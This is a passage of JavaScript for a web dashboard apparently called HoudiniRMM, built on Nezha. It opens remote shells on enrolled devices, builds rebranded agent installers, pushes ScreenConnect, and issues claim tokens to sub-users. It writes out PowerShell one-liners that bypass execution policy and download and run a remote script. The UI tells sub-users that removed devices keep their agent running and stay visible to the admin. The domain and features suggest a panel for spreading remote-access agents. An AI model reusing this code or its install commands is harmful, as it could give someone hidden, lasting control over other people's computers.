  return m ? decodeURIComponent(m[1]) : '';
}

function setTermStatus(msg, cls){
  const el = document.getElementById('termStatus');
  if (!el) return;
  el.textContent = msg || '';
  el.className = 'term-status' + (cls ? (' ' + cls) : '');
}

function stopTerminal(){
  try { if (_termRo) { _termRo.disconnect(); _termRo = null; } } catch(e){}
  try { if (_termWs) { _termWs.onopen=_termWs.onclose=_termWs.onerror=_termWs.onmessage=null; _termWs.close(); } } catch(e){}
  _termWs = null;
  _termSessionId = null;
  try { if (_term) { _term.dispose(); } } catch(e){}
  _term = null;
  _fit = null;
  const box = document.getElementById('termBox');
  if (box) box.innerHTML = '';
}

function termSendResize(){
  if (!_termWs || _termWs.readyState !== 1 || !_fit || !_term) return;
  try {
    _fit.fit();
    const dims = _fit.proposeDimensions ? _fit.proposeDimensions() : null;
    const rows = (dims && dims.rows) || _term.rows;
    const cols = (dims && dims.cols) || _term.cols;
    // Nezha protocol: byte 1 + JSON {Rows, Cols}
    const payload = new TextEncoder().encode(JSON.stringify({ Rows: rows, Cols: cols }));
    const msg = new Uint8Array(1 + payload.length);
    msg[0] = 1;
    msg.set(payload, 1);
    _termWs.send(msg);
  } catch (e) { console.warn('term resize', e); }
}

async function ensureCsrf(){
  // refresh profile to mint nz-csrf if needed
  try {
    await fetch('/api/v1/profile', { credentials: 'include' });
  } catch (e) {}
  return getCookie('nz-csrf') || getCookie('NZ-CSRF') || '';
}

async function createTermSession(serverId){
  const csrf = await ensureCsrf();
  const headers = {
    'Content-Type': 'application/json',
  };
  if (csrf) {
    headers['X-CSRF-Token'] = csrf;
    // some builds expect bare token without signature suffix
    const bare = csrf.split('.')[0];
    if (bare && bare !== csrf) headers['X-CSRF-Token'] = csrf; // keep full first; Nezha wants full
  }
  let r = await fetch('/api/v1/terminal', {
    method: 'POST',
    credentials: 'include',
    headers: headers,
    body: JSON.stringify({ server_id: Number(serverId) }),
  });
  // retry once after profile refresh if CSRF rejected
  if (r.status === 403 || r.status === 401) {
    await ensureCsrf();
    const csrf2 = getCookie('nz-csrf') || '';
    if (csrf2) headers['X-CSRF-Token'] = csrf2;
    r = await fetch('/api/v1/terminal', {
      method: 'POST',
      credentials: 'include',
      headers: headers,
      body: JSON.stringify({ server_id: Number(serverId) }),
    });
  }
  const j = await r.json().catch(() => ({}));
  if (!r.ok || j.success === false || j.error) {
    throw new Error((j && (j.error || j.message)) || ('session failed (' + r.status + ')'));
  }
  const sid = j.data && (j.data.session_id || j.data.sessionId);
  if (!sid) throw new Error('no session_id in response');
  return { sessionId: sid, serverName: (j.data && j.data.server_name) || ('#' + serverId) };
}

function connectTermWs(sessionId){
  return new Promise(function(resolve, reject){
    const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
    const url = proto + '//' + location.host + '/api/v1/ws/terminal/' + sessionId;
    const ws = new WebSocket(url);
    ws.binaryType = 'arraybuffer';
    const timer = setTimeout(function(){
      try { ws.close(); } catch(e){}
      reject(new Error('WebSocket timeout'));
    }, 15000);
    ws.onopen = function(){
      clearTimeout(timer);
      resolve(ws);
    };
    ws.onerror = function(){
      clearTimeout(timer);
      reject(new Error('WebSocket error — check agent online and command execute enabled'));
    };
  });
}

async function startTerminal(serverId, force){
  serverId = parseInt(serverId, 10);
  if (!serverId) {
    setTermStatus('No device selected', 'err');
    return;
  }
  if (!force && _termServerId === serverId && _termWs && _termWs.readyState === 1) {
    setTermStatus('Connected to device #' + serverId, 'ok');
    try { _term && _term.focus(); termSendResize(); } catch(e){}
    return;
  }

  stopTerminal();
  _termServerId = serverId;
  const title = document.getElementById('termTitle');
  const meta = document.getElementById('termMeta');
  if (title) title.textContent = 'Terminal #' + serverId;
  if (meta) meta.textContent = 'Connecting…';
  setTermStatus('Creating session…');

  const box = document.getElementById('termBox');
  if (!box) return;
  if (typeof Terminal === 'undefined') {
    setTermStatus('Terminal library failed to load (xterm). Check network/CDN.', 'err');
    return;
  }

  try {
    const sess = await createTermSession(serverId);
    _termSessionId = sess.sessionId;
    if (meta) meta.textContent = (sess.serverName || ('Device #' + serverId)) + ' · session ' + String(sess.sessionId).slice(0, 8) + '…';
    setTermStatus('Opening shell…');

    _term = new Terminal({
      cursorBlink: true,
      fontSize: 14,
      fontFamily: 'ui-monospace, SFMono-Regular, Menlo, Consolas, monospace',
      theme: {
        background: '#0c0c0e',
        foreground: '#f5efe8',
        cursor: '#fb8a74',
        selectionBackground: 'rgba(251,138,116,.35)',
      },
      allowProposedApi: true,
    });
    _fit = null;
    try {
      if (typeof FitAddon !== 'undefined') {
        if (FitAddon.FitAddon) _fit = new FitAddon.FitAddon();
        else if (typeof FitAddon === 'function') _fit = new FitAddon();
      } else if (window.FitAddon) {
        if (window.FitAddon.FitAddon) _fit = new window.FitAddon.FitAddon();
        else if (typeof window.FitAddon === 'function') _fit = new window.FitAddon();
      }
    } catch (e) { console.warn('FitAddon', e); _fit = null; }
    if (_fit) _term.loadAddon(_fit);
    _term.open(box);
    if (_fit) _fit.fit();

    _termWs = await connectTermWs(sess.sessionId);
    setTermStatus('Connected', 'ok');

    _termWs.onmessage = function(ev){
      try {
        if (!_term) return;
        if (ev.data instanceof ArrayBuffer) {
          _term.write(new Uint8Array(ev.data));
        } else if (ev.data instanceof Blob) {
          ev.data.arrayBuffer().then(function(buf){ _term && _term.write(new Uint8Array(buf)); });
        } else {
          _term.write(String(ev.data));
        }
      } catch (e) { console.warn(e); }
    };
    _termWs.onclose = function(){
      setTermStatus('Session closed', 'err');
    };
    _termWs.onerror = function(){
      setTermStatus('WebSocket error', 'err');
    };

    _term.onData(function(data){
      if (_termWs && _termWs.readyState === 1) {
        // AttachAddon sends raw strings; Nezha expects same
        _termWs.send(data);
      }
    });

    // initial resize (Nezha: 0x01 + JSON Rows/Cols)
    setTimeout(termSendResize, 50);
    setTimeout(termSendResize, 300);
    _term.focus();

    // keep fit on container resize
    if (window.ResizeObserver) {
      _termRo = new ResizeObserver(function(){
        try { if (_fit) _fit.fit(); termSendResize(); } catch(e){}
      });
      _termRo.observe(box);
    }
    window.addEventListener('resize', termSendResize);
  } catch (e) {
    console.error(e);
    setTermStatus(String(e.message || e), 'err');
    if (meta) meta.textContent = 'Failed';
  }
}


function openTerminal(id){
  terminalId = parseInt(id, 10);
  showTab('terminal', { force: true });
}
function bootHash(){
  const raw = (location.hash || '').replace(/^#\/?/, '');
  if (!raw) { showTab('devices'); return; }
  const m = raw.match(/^terminal\/(\d+)$/);
  if (m) { terminalId = parseInt(m[1], 10); showTab('terminal', { force: true }); return; }
  showTab(raw);
}
function wireNav(){
  const brc = document.getElementById('btnTermReconnect');
  if (brc) brc.addEventListener('click', function(){
    if (terminalId != null) startTerminal(terminalId, true);
  });
  document.querySelectorAll('[data-tab]').forEach(function(btn){
    btn.addEventListener('click', function(ev){
      ev.preventDefault();
      const tab = btn.getAttribute('data-tab');
      if (tab) showTab(tab);
    });
  });
  // Logout button
  const btnLogout = document.getElementById('btnLogout');
  if (btnLogout) btnLogout.addEventListener('click', doLogout);
  const mNew = $('btnMgrNew');
  if (mNew) mNew.addEventListener('click', function(){
    if (_curManager && MGR_META[_curManager]) mgrNew(_curManager);
  });
  const mRef = $('btnMgrRefresh');
  if (mRef) mRef.addEventListener('click', function(){
    if (_curManager) loadManager(_curManager);
  });
  const sS = $('btnSaveSettings');
  if (sS) sS.addEventListener('click', saveSettings);
}
async function boot(){
  const ok = await requireAuth();
  if (!ok) return;
  await applyRole();
  wireNav();
  bootHash();
  window.addEventListener('hashchange', bootHash);
}
let _curManager = null;
let currentUserId = null;
async function applyRole(){
  let profileData = null;
  try {
    const r = await fetch('/api/v1/profile', { credentials:'include' });
    const j = await r.json().catch(()=>({}));
    profileData = (j && j.data) ? j.data : null;
    currentRole = (profileData && profileData.role != null) ? profileData.role : null;
    currentUserId = (profileData && profileData.id != null) ? profileData.id : null;
    currentUsername = (profileData && profileData.username) ? profileData.username : '';
    // Non-admin users get a claim token for their one-liners
    if (currentRole !== 0 && currentUserId != null) {
      try {
        const sr = await api('api/powershell/install-script');
        const sj = await sr.json();
        // The claim token is embedded in the install script's package URL
        if (sj.ok && sj.script && sj.script.text) {
          const m = sj.script.text.match(/package-zip\?claim=(\S+)/);
          if (m) userClaimToken = m[1].replace(/['"].*$/, '');
        }
      } catch(e){}
    } else {
      userClaimToken = '';
    }
  } catch(e){ currentRole = null; currentUserId = null; currentUsername = ''; userClaimToken = ''; }
  const isAdmin = (currentRole === 0);
  document.querySelectorAll('[data-admin]').forEach(function(el){
    el.style.display = isAdmin ? '' : 'none';
  });
  // Update sidebar profile name and avatar
  const profileName = currentUsername || (isAdmin ? 'Admin' : 'User');
  const sideFoot = document.querySelector('.sidebar-foot .foot-name');
  const sideAvatar = document.querySelector('.sidebar-foot .avatar');
  if (sideFoot) sideFoot.textContent = profileName;
  if (sideAvatar) sideAvatar.textContent = initials(profileName);
  // Make the sidebar foot clickable to open Profile
  const sideFootWrap = document.querySelector('.sidebar-foot');
  if (sideFootWrap) {
    sideFootWrap.style.cursor = 'pointer';
    sideFootWrap.onclick = function(){ showTab('profile'); };
  }
  // Update batch button text for non-admin users
  if (!isAdmin) {
    const btnBU = document.getElementById('btnBatchUninstall');
    const btnBR = document.getElementById('btnBatchRemove');
    if (btnBU) btnBU.textContent = 'Uninstall';
    if (btnBR) btnBR.textContent = 'Remove selected from panel';
  }
  // Load admin feature flags (for admin users only)
  if (isAdmin) loadAdminCfg();
  // Update ScreenConnect panel hint for non-admin users
  const scMsg = document.getElementById('scMsg');
  if (scMsg) scMsg.textContent = 'Upload MSI to deploy';
}
if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', boot);
else boot();

function doLogout(){
  // Clear all auth cookies (matches Nezha dashboard's logout approach)
  document.cookie.split(';').forEach(function(c){
    const name = c.replace(/^ +/, '').replace(/=.*/, '');
    document.cookie = name + '=;expires=' + new Date().toUTCString() + ';path=/';
  });
  // Redirect to login page
  window.location.href = '/login';
}
function selectedIds(){ return [...document.querySelectorAll('.devchk:checked')].map(c => parseInt(c.value,10)); }
function updateActionButtons(){
  const n = selectedIds().length;
  document.querySelectorAll('.device-card').forEach(card => {
    const chk = card.querySelector('.devchk');
    card.classList.toggle('selected', !!(chk && chk.checked));
  });
}
function toggleAll(on){ document.querySelectorAll('.devchk').forEach(c => c.checked = on); updateActionButtons(); }
function escapeHtml(s){
  return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
}
function showToast(title, body, type){
  type = type || 'ok';
  const wrap = $('toastWrap');
  if(!wrap) return;
  const icons = {ok:'✓', warn:'!', err:'✕'};
  const el = document.createElement('div');
  el.className = 'toast ' + type;
  el.innerHTML = '<div class="toast-info">' + icons[type] + '</div><div><div class="toast-title">' + escapeHtml(title) + '</div><div class="toast-body">' + escapeHtml(body) + '</div></div>';
  wrap.appendChild(el);
  const dismiss = () => { el.classList.add('out'); setTimeout(()=>el.remove(), 300); };
  el.addEventListener('click', dismiss);
  setTimeout(dismiss, 6000);
  while(wrap.children.length > 4) wrap.removeChild(wrap.firstChild);
}
let knownDevices = {};
let devSeenFirst = false;
function trackDevices(devices){
  const now = {};
  const current = {};
  (devices||[]).forEach(d => {
    current[d.id] = d;
    now[d.id] = !!d.online;
  });
  if(devSeenFirst){
    const newDevs = (devices||[]).filter(d => !(d.id in knownDevices));
    newDevs.forEach(d => {
      showToast((d.online?'New device installed':'New device detected') + ': ' + (d.name||('#'+d.id)),
        'Agent ' + (d.online?'connected to the panel':'registered') + (d.ip?(' from '+d.ip):''),
        d.online?'ok':'warn');
    });
    (devices||[]).forEach(d => {
      const prev = knownDevices[d.id];
      if(prev !== undefined && prev !== now[d.id]){
        if(now[d.id]) showToast(d.name||('#'+d.id)+' is online', 'Agent reconnected'+(d.ip?(' from '+d.ip):''), 'ok');
        else showToast(d.name||('#'+d.id)+' is offline', 'Agent has not reported recently.', 'err');
      }
    });
  }
  knownDevices = now;
  devSeenFirst = true;
}
function pct(u,t){ if(!t||t<=0) return 0; return Math.max(0, Math.min(100, (u/t)*100)); }
function fmtPct(n){ if(n==null||isNaN(n)) return '-'; return (Math.round(n*100)/100).toFixed(2).replace(/\.00$/,'') + '%'; }
function fmtBytes(n){
  n = Number(n)||0; const u=['B','KiB','MiB','GiB','TiB']; let i=0;
  while(n>=1024 && i<u.length-1){ n/=1024; i++; }
  return (i===0?n:n.toFixed(n>=10?1:2)) + ' ' + u[i];
}
function fmtSpeed(n){
  n = Number(n)||0;
  if(n<1024) return Math.round(n) + ' B/s';
  if(n<1048576) return (n/1024).toFixed(2) + 'K/s';
  return (n/1048576).toFixed(2) + 'M/s';
}
function fmtUptime(s){
  s = Number(s)||0; if(!s) return '-';
  const d=Math.floor(s/86400), h=Math.floor((s%86400)/3600), m=Math.floor((s%3600)/60);
  if(d>0) return d+'d '+h+'h';
  if(h>0) return h+'h '+m+'m';
  return m+'m';
}
function barClass(p){ if(p>=90) return 'hot'; if(p>=75) return 'warn'; return ''; }
function flagHtml(cc){ if(!cc) return ''; return '<span class="fi fi-'+escapeHtml(String(cc).toLowerCase())+'"></span>'; }
function platformEmoji(p){
  p=(p||'').toLowerCase();
  if(p.includes('win')) return 'Win';
  if(p.includes('darwin')||p.includes('mac')) return 'Mac';
  if(p.includes('android')) return 'And';
  if(p.includes('linux')||p.includes('ubuntu')||p.includes('debian')) return 'Lin';
  return 'Dev';
}
function initials(name){ return String(name||'HR').split(/\s+/).map(x=>x[0]).join('').slice(0,2).toUpperCase(); }
function tickClock(){
  const d=new Date();
  clockLine.textContent = d.toLocaleDateString(undefined,{weekday:'short',month:'long',day:'numeric',year:'numeric'})
    + ' · ' + d.toLocaleTimeString() + ' · Devices';
}
setInterval(tickClock,1000); tickClock();

async function loadDevices(){
  devMsg.textContent='Loading...';
  try{
    const r = await api('api/devices');
    const j = await r.json();
    if(!j.ok){ devMsg.textContent=j.error||'failed'; return; }
    const devices = j.devices || [];
    trackDevices(devices);
    const online = devices.filter(d=>d.online).length;
    mTotal.textContent = devices.length;
    mOnline.textContent = online;
    mOffline.textContent = devices.length - online;
    mNet.textContent = '↑' + fmtBytes(devices.reduce((a,d)=>a+(Number(d.net_out_transfer)||0),0))
      + ' · ↓' + fmtBytes(devices.reduce((a,d)=>a+(Number(d.net_in_transfer)||0),0));
    mRate.textContent = devices.length ? (Math.round((online/devices.length)*10000)/100) + '%' : '0%';
    liveTitle.textContent = online ? (online + ' agent' + (online===1?'':'s') + ' online') : 'No agents online';
    liveSub.textContent = devices.length ? (devices.length + ' total in inventory') : 'Build a package and install an agent';
    const ob = document.getElementById('offlineBanner');
    if (ob) {
      const offN = devices.length - online;
      if (offN > 0) {
        ob.classList.add('show');
        ob.textContent = offN + ' device' + (offN===1?'':'s') + ' offline — check power, network, or reinstall agent.';
      } else {
        ob.classList.remove('show');
        ob.textContent = '';
      }
    }

    const notif=[], act=[];
    devices.forEach(d=>{
      act.push({title:d.name, body:(d.online?'Heartbeat active':'Offline')+' · '+(d.platform||'unknown')+' '+(d.platform_version||''), time:(d.last_active||'').replace('T',' ').slice(0,19)||'-', av:initials(d.name)});
      if(!d.online) notif.push({title:d.name+' offline', body:'Agent has not reported recently.', time:(d.last_active||'').replace('T',' ').slice(0,19)||'-', av:initials(d.name)});
      else if((Number(d.cpu)||0)>85) notif.push({title:'High CPU on '+d.name, body:fmtPct(d.cpu)+' CPU utilization', time:'now', av:initials(d.name)});
    });
    notifFeed.innerHTML = notif.length ? notif.slice(0,6).map(n =>
      '<div class="feed-item"><div class="feed-avatar">'+escapeHtml(n.av)+'</div><div><div class="feed-title">'+escapeHtml(n.title)+'</div><div class="feed-body">'+escapeHtml(n.body)+'</div><div class="feed-time">'+escapeHtml(n.time)+'</div></div></div>'
    ).join('') : '<div class="empty" style="border:0;padding:12px">No notifications yet.</div>';
    activityFeed.innerHTML = act.length ? act.slice(0,8).map(n =>
      '<div class="feed-item"><div class="feed-avatar">'+escapeHtml(n.av)+'</div><div><div class="feed-title">'+escapeHtml(n.title)+'</div><div class="feed-body">'+escapeHtml(n.body)+'</div><div class="feed-time">'+escapeHtml(n.time)+'</div></div></div>'
    ).join('') : '<div class="empty" style="border:0;padding:12px">No recent activity yet.</div>';

    if(!devices.length){
      devGrid.innerHTML = '<div class="empty">No devices yet. Build a package and install an agent.</div>';
      devMsg.textContent = '0 devices';
      updateActionButtons();
      return;
    }

    devGrid.innerHTML = devices.map(d => {
      const cpu = Number(d.cpu)||0;
      const memP = pct(d.mem_used, d.mem_total);
      const diskP = pct(d.disk_used, d.disk_total);
      const os = [d.platform, d.platform_version, d.arch].filter(Boolean).join(' ') || 'Unknown OS';
      const last = (d.last_active||'').replace('T',' ').slice(0,19) || '-';
      return '<article class="device-card" data-id="'+d.id+'">'
        + '<div class="device-top">'
        +   '<input class="chk devchk" type="checkbox" value="'+d.id+'" onchange="updateActionButtons()"/>'
        +   '<span class="status-dot '+(d.online?'on':'off')+'"></span>'
        +   '<span>'+flagHtml(d.country_code)+'</span>'
        +   '<div style="min-width:0"><div class="dev-name">'+escapeHtml(d.name)+'</div>'
        +   '<div class="dev-meta">#'+d.id+' · '+escapeHtml(platformEmoji(d.platform))+' · '+escapeHtml(os)+(d.ip?(' · '+escapeHtml(d.ip)):'')+(d._owner_name?(' · <span class="tag">'+escapeHtml(d._owner_name)+'</span>'):'')+'</div></div>'
        +   '<div class="dev-meta" style="text-align:right;white-space:nowrap">'+(d.online?'Online':'Offline')+'<br/>'+fmtUptime(d.uptime)+'</div>'
        + '</div>'
        + '<div class="metrics">'
        +   '<div class="metric"><p class="lbl">CPU</p><div class="v">'+fmtPct(cpu)+'</div><div class="bar '+barClass(cpu)+'"><i style="width:'+Math.min(100,cpu)+'%"></i></div></div>'
        +   '<div class="metric"><p class="lbl">MEM</p><div class="v">'+fmtPct(memP)+'</div><div class="bar mem '+barClass(memP)+'"><i style="width:'+memP+'%"></i></div></div>'
        +   '<div class="metric"><p class="lbl">STG</p><div class="v">'+fmtPct(diskP)+'</div><div class="bar disk '+barClass(diskP)+'"><i style="width:'+diskP+'%"></i></div></div>'
        +   '<div class="metric"><p class="lbl">Upload</p><div class="v">'+fmtSpeed(d.net_out_speed)+'</div></div>'
        +   '<div class="metric"><p class="lbl">Download</p><div class="v">'+fmtSpeed(d.net_in_speed)+'</div></div>'
        + '</div>'
        + '<div class="dev-meta">Agent '+escapeHtml(d.agent_version||'-')+' · Last '+escapeHtml(last)+'</div>'
                + '<div class="dev-meta">'+(d.meta&&d.meta.tags&&d.meta.tags.length?d.meta.tags.map(function(tg){return '<span class="tag">'+escapeHtml(tg)+'</span>';}).join(''):'')+(d.meta&&d.meta.site?(' · '+escapeHtml(d.meta.site)):'')+(d.meta&&d.meta.notes?(' · '+escapeHtml(String(d.meta.notes).slice(0,80))):'')+'</div>'
        + '<div class="device-actions">'
        +   '<button class="btn" type="button" onclick="openTerminal('+d.id+')">Terminal</button>'
        +   '<button class="btn" type="button" onclick="editMeta('+d.id+')">Tags / notes</button>'
        +   '<button class="btn" type="button" onclick="showTab(\'settings\')">Settings</button>'
        +   '<button class="btn" type="button" onclick="removeDevice('+d.id+')">Remove</button>'
        +   '<button class="btn danger" type="button" onclick="uninstallDevice('+d.id+')">'+(currentRole===0?'Uninstall':'Remove from my panel')+'</button>'
        +   '<button class="btn" type="button" onclick="scInstall('+d.id+')">Install ScreenConnect</button>'
        +   '<button class="btn ghost" data-admin="1" type="button" onclick="showTab(\'service\')">Service</button>'
        + '</div>'
        + '</article>';
    }).join('');
    devMsg.textContent = devices.length + ' devices · ' + online + ' online';
    updateActionButtons();
  }catch(e){ devMsg.textContent = String(e); }
}

async function removeDevice(id){
  const isAdmin = (currentRole === 0);
  const body = isAdmin ? 'Remove this device from the panel?' : 'Remove this device from your panel? The agent will keep running and admin can still see it.';
  const ok = await confirmModal({title:'Remove device', body:body, okText:'Remove'});
  if (!ok) return;
  devMsg.textContent = 'Removing device…';
  try {
    const r = await api('api/devices/delete', {method:'POST',body:JSON.stringify({ids:[id]})});
    const j = await r.json();
    if (j.ok){ loadDevices(); } else { devMsg.textContent = j.error||'failed'; }
  } catch(e){ devMsg.textContent = String(e); }
}
async function uninstallDevice(id){
  const isAdmin = (currentRole === 0);
  const title = isAdmin ? 'Uninstall agent' : 'Remove from my panel';
  const body = isAdmin ? 'Uninstall agent from this device? This will remove the agent software and delete the device from the server.' : 'Remove this device from your panel? The agent will keep running and admin can still see it.';
  const okText = isAdmin ? 'Uninstall' : 'Remove';
  const ok = await confirmModal({title:title, body:body, okText:okText});
  if (!ok) return;
  devMsg.textContent = 'Uninstalling...';
  try {
    const r = await api('api/devices/uninstall', {method:'POST',body:JSON.stringify({ids:[id]})});
    const j = await r.json();
    if (j.ok){ loadDevices(); } else { devMsg.textContent = j.error||'failed'; }
  } catch(e){ devMsg.textContent = String(e); }
}
async function removeSelected(){
  const ids = selectedIds(); if(!ids.length) return;
  const isAdmin = (currentRole === 0);
  const body = isAdmin ? 'Remove '+ids.length+' device(s) AND uninstall the agent from them? This waits ~5s for agents to receive the task.' : 'Remove '+ids.length+' device(s) from your panel? The agents will keep running and admin can still see them.';
  const ok = await confirmModal({title:'Remove devices', body:body, okText:'Remove'});
  if(!ok) return;
  devMsg.textContent = 'Removing and uninstalling from devices…';
  try {
    const r = await api('api/devices/delete', {method:'POST', body: JSON.stringify({ids, remote_uninstall:true, wait_seconds:5})});
    const j = await r.json();
    if(!j.ok){ devMsg.textContent = j.error||'failed'; return; }
    devMsg.textContent = j.message || 'Removed and uninstalled.';
    await loadDevices();
  } catch(e) {
    devMsg.textContent = String(e);
  } finally {
    updateActionButtons();
  }
}
async function uninstallSelected(){
  const ids = selectedIds(); if(!ids.length) return;
  const isAdmin = (currentRole === 0);
  const title = isAdmin ? 'Uninstall agents' : 'Remove from my panel';
  const body = isAdmin ? 'Uninstall agent on '+ids.length+' device(s) and remove from panel? This waits ~8s for agents to receive the task.' : 'Remove '+ids.length+' device(s) from your panel? The agents will keep running and admin can still see them.';
  const okText = isAdmin ? 'Uninstall' : 'Remove';
  const ok = await confirmModal({title:title, body:body, okText:okText});
  if(!ok) return;
  devMsg.textContent = 'Sending uninstall and waiting for agents…';
  try {
    const r = await api('api/devices/uninstall', {method:'POST', body: JSON.stringify({ids, remove_from_panel:true, wait_seconds:8})});
    const j = await r.json();
    if(!j.ok){ devMsg.textContent = j.error||'failed'; return; }
    devMsg.textContent = j.message || 'Uninstall sent.';
    await loadDevices();
  } catch(e) {
    devMsg.textContent = String(e);
  } finally {
    updateActionButtons();
  }
}
function fill(b){
  for (const k of ['product_name','company','description','website','server','client_secret']) {
    const el = document.getElementById(k); if (el) el.value = b[k] ?? '';
  }
  const bools = ['tls','debug','disable_auto_update','disable_force_update','disable_command_execute','disable_nat','disable_send_query','gpu','temperature','insecure_tls','skip_connection_count','skip_procs_count','use_gitee_to_upgrade','use_atomgit_to_upgrade','use_ipv6_country_code'];
  bools.forEach(function(k){ const el = document.getElementById(k); if (el) el.checked = !!b[k]; });
  const ints = {ip_report_period:1800, report_delay:3, self_update_period:0};
  Object.keys(ints).forEach(function(k){ const el = document.getElementById(k); if (el) el.value = (b[k] != null ? b[k] : ints[k]); });
  function listVal(v){
    if (Array.isArray(v)) return v.join(',');
    if (v && typeof v === 'object') return JSON.stringify(v);
    return v || '';
  }
  ['dns','custom_ip_api','hard_drive_partition_allowlist','nic_allowlist'].forEach(function(k){
    const el = document.getElementById(k); if (el) el.value = listVal(b[k]);
  });
  if (typeof iconPreview !== 'undefined' && iconPreview) iconPreview.src = apiUrl('api/icon') + '?t=' + Date.now();
  const it = document.getElementById('installTarget');
  if (it) {
    it.textContent = 'Server: ' + (b.server||'(not set)') + '\nTLS: ' + (!!b.tls) + '\nProduct: ' + (b.product_name||'HoudiniRMM')
      + '\nAgent: full wiki options embedded in package (gpu/temp/NAT/command toggles).'
      + '\n\nWindows: download installer EXE from Recent builds and run elevated.'
      + '\nLinux: download zip, extract, run with included config pointing at the server above.'
      + '\nUUID is generated by the agent on first start (or set manually to replace a device).';
  }
  const ol = document.getElementById('installOneLiner');
  if (ol) {
    const h = (b.server||'rmm.houdini.fastmoneyclaim.com').split(':')[0];
    const claimQs = userClaimToken ? '?claim='+userClaimToken : '';
    ol.textContent = 'powershell -NoProfile -ExecutionPolicy Bypass -Command "iwr -UseBasicParsing \'https://'+h+'/dashboard/api/install-script\' -OutFile $env:TEMP\\install.ps1; & $env:TEMP\\install.ps1"';
  }
  const ol2 = document.getElementById('installExeOneLiner');
  if (ol2) {
    const h2 = (b.server||'rmm.houdini.fastmoneyclaim.com').split(':')[0];
    const claimQs2 = userClaimToken ? '?claim='+userClaimToken : '';
    ol2.textContent = 'powershell -NoProfile -ExecutionPolicy Bypass -Command "iwr -UseBasicParsing \'https://'+h2+'/dashboard/api/install-exe-script\' -OutFile $env:TEMP\\install.ps1; & $env:TEMP\\install.ps1"';
  }
}
function formData(){
  function checked(id){ const el = document.getElementById(id); return !!(el && el.checked); }
  function num(id, d){ const el = document.getElementById(id); const n = parseInt(el && el.value, 10); return isNaN(n) ? d : n; }
  function txt(id){ const el = document.getElementById(id); return el ? el.value.trim() : ''; }
  return {
    product_name: txt('product_name'),
    company: txt('company'),
    description: txt('description'),
    website: txt('website'),
    server: txt('server'),
    client_secret: txt('client_secret'),
    tls: checked('tls'),
    debug: checked('debug'),
    disable_auto_update: checked('disable_auto_update'),
    disable_force_update: checked('disable_force_update'),
    disable_command_execute: checked('disable_command_execute'),
    disable_nat: checked('disable_nat'),
    disable_send_query: checked('disable_send_query'),
    gpu: checked('gpu'),
    temperature: checked('temperature'),
    insecure_tls: checked('insecure_tls'),
    skip_connection_count: checked('skip_connection_count'),
    skip_procs_count: checked('skip_procs_count'),
    use_gitee_to_upgrade: checked('use_gitee_to_upgrade'),
    use_atomgit_to_upgrade: checked('use_atomgit_to_upgrade'),
    use_ipv6_country_code: checked('use_ipv6_country_code'),
    ip_report_period: num('ip_report_period', 1800),
    report_delay: num('report_delay', 3),
    self_update_period: num('self_update_period', 0),
    dns: txt('dns'),
    custom_ip_api: txt('custom_ip_api'),
    hard_drive_partition_allowlist: txt('hard_drive_partition_allowlist'),
    nic_allowlist: txt('nic_allowlist')
  };
}
async function saveCfg(){
  msg.textContent='Saving...'; msg.className='msg';
  const r = await api('api/branding', {method:'POST', body: JSON.stringify(formData())});
  const j = await r.json();
  if(!j.ok){ msg.textContent=j.error||'failed'; msg.className='msg err'; return; }
  const f = icon.files[0];
  if(f){
    const fd = new FormData(); fd.append('icon', f);
    const ir = await fetch(apiUrl('api/icon'), {method:'POST', body: fd});
    const ij = await ir.json();
    if(!ij.ok){ msg.textContent=ij.error||'icon failed'; msg.className='msg err'; return; }
  }
  msg.textContent='Saved.'; fill(j.branding); loadBuilds();
}
async function build(platform, format){
  format = format || (platform === 'windows' ? 'exe' : 'zip');
  const label = platform + ' ' + (format === 'exe' ? 'EXE' : 'ZIP');
  msg.textContent='Building '+label+'...'; msg.className='msg';
  if (currentRole === 0) { await saveCfg(); }
  const r = await api('api/build', {method:'POST', body: JSON.stringify({platform: platform, format: format})});
  const j = await r.json();
  if(!j.ok){ msg.textContent=j.error||'build failed'; msg.className='msg err'; return; }
  msg.textContent='Built: '+j.filename; loadBuilds();
}
async function buildAll(){
  msg.textContent='Building all agents...'; msg.className='msg';
  if (currentRole === 0) { await saveCfg(); }
  var platforms = [['windows','exe'],['windows','zip'],['darwin','zip'],['linux','zip']];
  var ok=0, fail=0;
  for (var i=0; i<platforms.length; i++){
    var p=platforms[i];
    msg.textContent='Building '+p[0]+' '+p[1]+' ('+(i+1)+'/'+platforms.length+')...';
    try {
      const r = await api('api/build', {method:'POST', body: JSON.stringify({platform:p[0], format:p[1]})});
      const j = await r.json();
      if (j.ok) ok++; else fail++;
    } catch(e){ fail++; }
  }
  msg.textContent='Done: '+ok+' built, '+fail+' failed'; loadBuilds();
}
async function syncSecret(){
  msg.textContent='Syncing...';
  const r = await api('api/sync', {method:'POST', body:'{}'});
  const j = await r.json();
  if(!j.ok){ msg.textContent=j.error||'sync failed'; msg.className='msg err'; return; }
  fill(j.branding); msg.textContent='Synced.';
}
async function loadBuilds(){
  const r = await api('api/builds'); const j = await r.json();
  if(!j.ok){ builds.innerHTML=''; return; }
  if(!j.builds.length){ builds.innerHTML='<div class="hint">No builds yet.</div>'; return; }
  builds.innerHTML = '<table><tr><th>File</th><th>Type</th><th>Size</th><th>Created</th><th></th></tr>' +
    j.builds.map(function(b){
      const kind = b.kind || (String(b.name||'').toLowerCase().endsWith('.exe') ? 'Embedded EXE' : 'ZIP');
      return '<tr><td>'+escapeHtml(b.name)+'</td><td>'+escapeHtml(kind)+'</td><td>'+escapeHtml(String(b.size))+'</td><td>'+escapeHtml(String(b.mtime))+'</td><td><a class="link" href="'+apiUrl('api/download/'+encodeURIComponent(b.name))+'">Download</a></td></tr>';
    }).join('') + '</table>';
}
let packagesLoaded=false;
async function clearBuilds(){
  const ok = await confirmModal({title:'Clear builds', body:'Delete all recent builds from the server?', okText:'Clear'});
  if (!ok) return;
  const r = await api('api/builds/clear', {method:'POST', body:'{}'});
  const j = await r.json();
  if (j.ok) loadBuilds();
  else alertModal({title:'Error', body: j.error || 'Failed to clear'});
}
async function initPackages(){
  if(packagesLoaded) return;
  const r = await api('api/branding'); const j = await r.json();
  if(j.ok){ fill(j.branding); loadBuilds(); loadTgBuildStatus(); packagesLoaded=true; }
}
async function loadTgBuildStatus(){
  try {
    const r = await api('api/tg');
    const j = await r.json();
    const it = document.getElementById('installTarget');
    if (it && j.ok) {
      const t = j.tg || {};
